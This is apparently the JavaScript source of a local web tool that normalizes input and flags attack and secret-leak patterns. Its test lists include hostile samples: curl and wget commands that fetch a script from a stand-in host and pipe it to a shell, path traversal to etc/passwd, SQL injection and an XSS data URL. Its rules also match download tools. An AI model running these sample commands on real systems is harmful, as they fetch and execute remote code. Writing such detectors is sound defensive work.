// app.js — NORMALIZATION + SECRETS (Freeze v3)
// Drop-in replacement for your current app.js
(() => {
  "use strict";

  const BUILD = "v2026-01-05_normalizer_v3_secrets_freeze";

  // Policy toggle (default: keep secrets as WARN, not BLOCK)
  const STRICT_SECRETS = false;

  const nowISO = () => new Date().toISOString();
  const $ = (id) => document.getElementById(id);

  function safeOn(el, evt, fn) {
    if (!el) return;
    el.addEventListener(evt, fn, { passive: true });
  }

  // -----------------------------
  // NORMALIZATION (core)
  // هدفها: نفس المدخل، مهما كان ترميزه (%2f/%252f/Backslashes/Mixed case) => نفس النتيجة
  // -----------------------------
  function safeDecodeURIComponentOnce(s) {
    try {
      // لا نفك "+" إلى مسافة لأن هذا يسبب false positives في كثير من logs
      return decodeURIComponent(s);
    } catch {
      return s;
    }
  }

  function normalizeInput(raw) {
    let s = (raw || "").trim();
    if (!s) return { raw: "", norm: "" };

    // 1) unify slashes early
    s = s.replace(/\\/g, "/");

    // 2) iterative percent-decode (handles %252f => %2f => /)
    // limit iterations to avoid pathological loops
    for (let i = 0; i < 3; i++) {
      const d = safeDecodeURIComponentOnce(s);
      if (d === s) break;
      s = d;
    }

    // 3) collapse repeated slashes in paths (not protocol "https://")
    s = s.replace(/([^:])\/{2,}/g, "$1/");

    // 4) remove invisible/control chars that mess with comparisons
    s = s.replace(/[\u0000-\u001F\u007F]/g, "");

    // 5) keep a lowercased shadow string for matching (we will use normLower for tests)
    return { raw, norm: s };
  }

  // -----------------------------
  // Metrics
  // -----------------------------
  function shannonEntropy(str) {
    if (!str) return 0;
    const freq = new Map();
    for (const ch of str) freq.set(ch, (freq.get(ch) || 0) + 1);
    const len = str.length;
    let ent = 0;
    for (const [, c] of freq) {
      const p = c / len;
      ent -= p * Math.log2(p);
    }
    return Math.round(ent * 100) / 100;
  }

  function looksLikeURL(s) {
    return /^https?:\/\//i.test(s) || /^[a-z0-9.-]+\.[a-z]{2,}(\/|$)/i.test(s);
  }

  function classifyType(normStr) {
    const x = (normStr || "").trim();
    if (!x) return "Data";

    const isURL = looksLikeURL(x) || /(^|[?&])(url|next|returnurl|redirect_uri)=/i.test(x);

    // ملاحظة: نستخدم normalized string هنا لتقليل bypass
    const isExploit =
      /<script|onerror=|onload=|javascript:|data:text\/html|(\.\.\/){2,}|\/windows\/system32|union\s+select|1=1|--\s*$|\b(wget|curl)\b.*\bhttps?:\/\/|powershell\s+-enc/i.test(x);

    if (isExploit) return "Exploit";
    if (isURL) return "URL";
    return "Data";
  }

  // -----------------------------
  // RULES (now run against normalized+lower)
  // -----------------------------
  const RULES = [
    // Redirect/open-redirect patterns
    {
      label: "REDIRECT_PARAM",
      test: (s) =>
        /(^|[?&])(redirect_uri|redirect|returnurl|returnUrl|next|url)=/i.test(s) ||
        /\b(returnUrl|next)=\/\/[^ \n]+/i.test(s),
      sev: 55,
      conf: 90,
    },

    // Auth endpoints (context)
    {
      label: "AUTH_ENDPOINT",
      test: (s) =>
        /(oauth\/authorize|oauth2\/authorize|\/signin\/oauth|login\.microsoftonline\.com\/common\/oauth2\/authorize)/i.test(s),
      sev: 45,
      conf: 80,
    },

    // Secrets (NEW)
    {
      label: "SECRET:AWS_ACCESS_KEY",
      test: (s) => /\bAKIA[0-9A-Z]{16}\b/.test(s),
      sev: 65,
      conf: 90,
      kind: "secret",
    },
    {
      label: "SECRET:PRIVATE_KEY_BLOCK",
      test: (s) =>
        /-----BEGIN (?:RSA |EC |OPENSSH |)?PRIVATE KEY-----/i.test(s) ||
        /-----END (?:RSA |EC |OPENSSH |)?PRIVATE KEY-----/i.test(s),
      sev: 80,
      conf: 95,
      kind: "secret",
    },
    {
      label: "SECRET:BEARER_TOKEN",
      test: (s) => /\bauthorization:\s*bearer\s+[A-Za-z0-9._\-+/=]{8,}/i.test(s),
      sev: 60,
      conf: 85,
      kind: "secret",
    },
    {
      label: "SECRET:JWT_LIKE",
      test: (s) => /\beyJ[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{8,}\b/.test(s),
      sev: 55,
      conf: 80,
      kind: "secret",
    },

    // Base64 HTML (kept)
    {
      label: "BASE64_DECODE",
      test: (s) => /(data:text\/html;base64,)/i.test(s),
      sev: 35,
      conf: 70,
    },

    // Obfuscation / encoding hints
    {
      label: "OBFUSCATION",
      test: (s) =>
        /%2f|%3a|%3d|%5c|\\x[0-9a-f]{2}|\\u[0-9a-f]{4}|[A-Za-z0-9+\/]{30,}={0,2}/i.test(s),
      sev: 35,
      conf: 67,
    },

    // Homograph / punycode
    {
      label: "HOMOGRAPH_RISK",
      test: (s) => /\bxn--/i.test(s),
      sev: 60,
      conf: 70,
    },

    // XSS / JS execution
    {
      label: "XSS/JS_SCRIPT",
      test: (s) =>
        /<script|onerror=|onload=|javascript:|data:text\/html|<img[^>]+onerror=|<svg[^>]+onload=/i.test(s),
      sev: 85,
      conf: 85,
    },

    // LFI (FIXED: normalized catches encoded traversal too)
    {
      label: "LFI:ETC_PASSWD",
      test: (s) =>
        /(\.\.\/){2,}etc\/passwd/i.test(s) ||
        /etc\/passwd/i.test(s) ||
        /\/windows\/system32\/drivers\/etc\/hosts/i.test(s),
      sev: 80,
      conf: 75,
    },

    // Command chaining (FIXED: avoid matching "data:text/html;base64")
    {
      label: "CMD:CMD_CHAIN",
      test: (s) =>
        /(?:^|\s)(?:&&|\|\|)\s*\w+/i.test(s) ||
        /(?:^|\s)[;|]\s*\w+/i.test(s) ||
        /\bpowershell\s+-enc\b/i.test(s),
      sev: 85,
      conf: 85,
    },

    // Download/execution
    {
      label: "DOWNLOAD_TOOL",
      test: (s) => /\b(wget|curl)\b.*\bhttps?:\/\/.*(\|\s*(sh|bash)|-O-|\|\s*sh)/i.test(s),
      sev: 90,
      conf: 90,
    },

    // SQLi
    {
      label: "SQL:SQLI_TAUTOLOGY",
      test: (s) =>
        /(1\s*=\s*1(\s*or\s*1\s*=\s*1)?|'\s*or\s*'1'\s*=\s*'1|admin'\s*--|select\s+\*\s+from\s+\w+\s+where)/i.test(s),
      sev: 75,
      conf: 85,
    },
    {
      label: "SQL:SQLI_UNION_ALL",
      test: (s) => /union\s+select/i.test(s),
      sev: 80,
      conf: 80,
    },
  ];

  function analyzeOne(input) {
    const { raw, norm } = normalizeInput((input || "").trim());
    const s = (norm || "").trim();
    const hits = [];

    for (const r of RULES) {
      if (r.test(s)) hits.push({ label: r.label, sev: r.sev, conf: r.conf, kind: r.kind || "signal" });
    }

    let severity = 0,
      confidence = 0;
    if (hits.length) {
      severity = Math.max(...hits.map((h) => h.sev));
      confidence = Math.max(...hits.map((h) => h.conf));
    }

    // Decision logic
    let decision = "ALLOW";

    const hasBlockSignal = hits.some((h) => h.sev >= 85) || hits.some((h) => h.label === "DOWNLOAD_TOOL");
    const hasWarnSignal = hits.some((h) => h.sev >= 55);

    // Secrets policy
    const hasSecret = hits.some((h) => h.kind === "secret");

    if (hasBlockSignal) decision = "BLOCK";
    else if (STRICT_SECRETS && hasSecret) decision = "BLOCK";
    else if (hasWarnSignal || hasSecret) decision = "WARN";

    const type = classifyType(s);
    const entropy = shannonEntropy(raw || s);

    return {
      input: (raw || "").trim(),
      normalized: s,
      type,
      decision,
      severity,
      confidence,
      entropy,
      hits: hits.map(({ label, sev, conf }) => ({ label, sev, conf })),
    };
  }

  function verdictFrom(rows) {
    const counts = { scans: rows.length, allow: 0, warn: 0, block: 0 };
    for (const r of rows) {
      if (r.decision === "ALLOW") counts.allow++;
      else if (r.decision === "WARN") counts.warn++;
      else counts.block++;
    }

    const peakSeverity = rows.length ? Math.max(...rows.map((r) => r.severity)) : 0;
    const confidence = rows.length ? Math.max(...rows.map((r) => r.confidence)) : 0;

    let verdict = "SECURE";
    if (counts.block > 0) verdict = "DANGER";
    else if (counts.warn > 0) verdict = "SUSPICIOUS";

    const sigMap = new Map();
    for (const r of rows) {
      for (const h of r.hits) sigMap.set(h.label, (sigMap.get(h.label) || 0) + 1);
    }
    const signals = [...sigMap.entries()]
      .sort((a, b) => b[1] - a[1])
      .map(([label, count]) => ({ label, count }));

    return { verdict, peakSeverity, confidence, counts, signals };
  }

  function buildReport(rows) {
    const meta = verdictFrom(rows);
    return {
      generatedAt: nowISO(),
      build: BUILD,
      policy: { STRICT_SECRETS },
      verdict: meta.verdict,
      peakSeverity: meta.peakSeverity,
      confidence: meta.confidence,
      counts: meta.counts,
      signals: meta.signals,
      rows,
    };
  }

  function setVerdictUI(meta) {
    const verdictText = $("verdictText");
    const box = $("verdictBox");
    if (!verdictText || !box) return;

    verdictText.textContent = meta.verdict;

    box.style.borderColor =
      meta.verdict === "DANGER"
        ? "rgba(239,68,68,.35)"
        : meta.verdict === "SUSPICIOUS"
        ? "rgba(245,158,11,.35)"
        : "rgba(45,212,191,.25)";

    $("peakSev").textContent = `Peak severity: ${meta.peakSeverity}%`;
    $("peakConf").textContent = `Confidence: ${meta.confidence}%`;

    $("kScans").textContent = String(meta.counts.scans);
    $("kAllow").textContent = String(meta.counts.allow);
    $("kWarn").textContent = String(meta.counts.warn);
    $("kBlock").textContent = String(meta.counts.block);

    const reco = $("reco");
    if (reco) {
      if (meta.verdict === "DANGER") {
        reco.textContent = "Remediation: Block these inputs in the pipeline. Do NOT open. Verify domain ownership. Escalate with JSON report.";
      } else if (meta.verdict === "SUSPICIOUS") {
        reco.textContent = "Remediation: Review suspicious entries. Verify domains. Sanitize/encode. Escalate if needed.";
      } else {
        reco.textContent = "No high-severity patterns detected.";
      }
    }

    const sigWrap = $("signals");
    if (sigWrap) {
      sigWrap.innerHTML = "";
      for (const s of meta.signals) {
        const d = document.createElement("div");
        d.className = "sig";
        d.textContent = `${s.label} ×${s.count}`;
        sigWrap.appendChild(d);
      }
      if (!meta.signals.length) {
        const d = document.createElement("div");
        d.className = "sig";
        d.textContent = "No active signals";
        sigWrap.appendChild(d);
      }
    }
  }

  function renderRows(rows) {
    const host = $("rows");
    if (!host) return;
    host.innerHTML = "";

    for (const r of rows) {
      const tr = document.createElement("div");
      tr.className = "trow";

      const dotClass = r.decision === "ALLOW" ? "ok" : r.decision === "WARN" ? "warn" : "bad";

      const c1 = document.createElement("div");
      c1.className = "mono";
      c1.textContent = r.input.length > 120 ? r.input.slice(0, 120) + "…" : r.input;

      const c2 = document.createElement("div");
      c2.textContent = r.type;

      const c3 = document.createElement("div");
      c3.className = "tag";
      const dot = document.createElement("span");
      dot.className = `dot ${dotClass}`;
      const t = document.createElement("span");
      t.textContent = r.decision;
      c3.append(dot, t);

      const c4 = document.createElement("div");
      c4.textContent = `${r.severity}%`;

      const c5 = document.createElement("div");
      c5.textContent = `${r.confidence}%`;

      const c6 = document.createElement("div");
      c6.textContent = String(r.entropy);

      tr.append(c1, c2, c3, c4, c5, c6);
      host.appendChild(tr);
    }
  }

  function parseInputLines(txt) {
    return (txt || "")
      .split(/\r?\n/)
      .map((s) => s.trim())
      .filter(Boolean);
  }

  // -----------------------------
  // TESTS (Updated to verify normalization + secrets)
  // -----------------------------
  const TEST_A = [
    "hello world",
    "https://example.com/",
    "https://good.com/redirect?next=https%3A%2F%2Fevil.com", // should still WARN (redirect + obfuscation)
    "..%252f..%252f..%252f..%252fetc%252fpasswd",           // MUST WARN now (normalization => ../../../../etc/passwd)
    "C:\\Windows\\System32\\drivers\\etc\\hosts",           // MUST WARN (LFI windows path normalized)
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", // BLOCK (XSS), and NOT CMD false-positive
    "; ls -la",                                             // BLOCK (cmd chain)
    "wget http://evl1.tld/a.sh -O- | sh",                   // BLOCK (download tool)
    "UNION SELECT username,password FROM users",            // WARN (SQL union)
    "Authorization: Bearer abc.def.ghi",                    // WARN (secret bearer)
    "AKIAIOSFODNN7EXAMPLE",                                 // WARN (AWS key)
    "-----BEGIN PRIVATE KEY-----",                           // WARN (secret key block)
  ];

  const TEST_B = [
    "hello world",
    "https://example.com/",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "url=javascript:alert(1)",
    "&& curl http://evl1.tld/payload.sh | sh",
    "-----BEGIN PRIVATE KEY-----",
  ];

  let lastReport = null;

  function runScanFromTextarea() {
    const inputEl = $("input");
    if (!inputEl) return;

    const lines = parseInputLines(inputEl.value);
    const rows = lines.map(analyzeOne);
    const report = buildReport(rows);

    lastReport = report;

    setVerdictUI({
      verdict: report.verdict,
      peakSeverity: report.peakSeverity,
      confidence: report.confidence,
      counts: report.counts,
      signals: report.signals,
    });

    renderRows(report.rows);
  }

  function exportJSON() {
    if (!lastReport) runScanFromTextarea();
    if (!lastReport) return;

    const blob = new Blob([JSON.stringify(lastReport, null, 2)], { type: "application/json" });
    const a = document.createElement("a");
    const ts = new Date().toISOString().replace(/[:.]/g, "-");
    a.download = `validoon_report_${ts}.json`;
    a.href = URL.createObjectURL(blob);
    document.body.appendChild(a);
    a.click();
    setTimeout(() => {
      URL.revokeObjectURL(a.href);
      a.remove();
    }, 0);
  }

  function clearAll() {
    const inputEl = $("input");
    if (inputEl) inputEl.value = "";
    lastReport = null;

    setVerdictUI({
      verdict: "SECURE",
      peakSeverity: 0,
      confidence: 0,
      counts: { scans: 0, allow: 0, warn: 0, block: 0 },
      signals: [],
    });

    renderRows([]);
  }

  function loadTest(lines) {
    const inputEl = $("input");
    if (!inputEl) return;
    inputEl.value = lines.join("\n");
    runScanFromTextarea();
  }

  function openInfo() {
    const dlg = $("infoDlg");
    if (dlg && typeof dlg.showModal === "function") dlg.showModal();
  }

  function closeInfo() {
    const dlg = $("infoDlg");
    if (dlg && typeof dlg.close === "function") dlg.close();
  }

  function boot() {
    const stamp = $("buildStamp");
    if (stamp) stamp.textContent = `Build: ${BUILD}`;

    setVerdictUI({
      verdict: "SECURE",
      peakSeverity: 0,
      confidence: 0,
      counts: { scans: 0, allow: 0, warn: 0, block: 0 },
      signals: [],
    });

    safeOn($("btnLoadA"), "click", () => loadTest(TEST_A));
    safeOn($("btnLoadB"), "click", () => loadTest(TEST_B));
    safeOn($("btnScan"), "click", runScanFromTextarea);
    safeOn($("btnExport"), "click", exportJSON);
    safeOn($("btnClear"), "click", clearAll);
    safeOn($("btnInfo"), "click", openInfo);
    safeOn($("btnCloseInfo"), "click", closeInfo);

    console.log(`[Validoon] ${BUILD} loaded. Local-only. No network. STRICT_SECRETS=${STRICT_SECRETS}`);
  }

  if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", boot);
  else boot();
})();
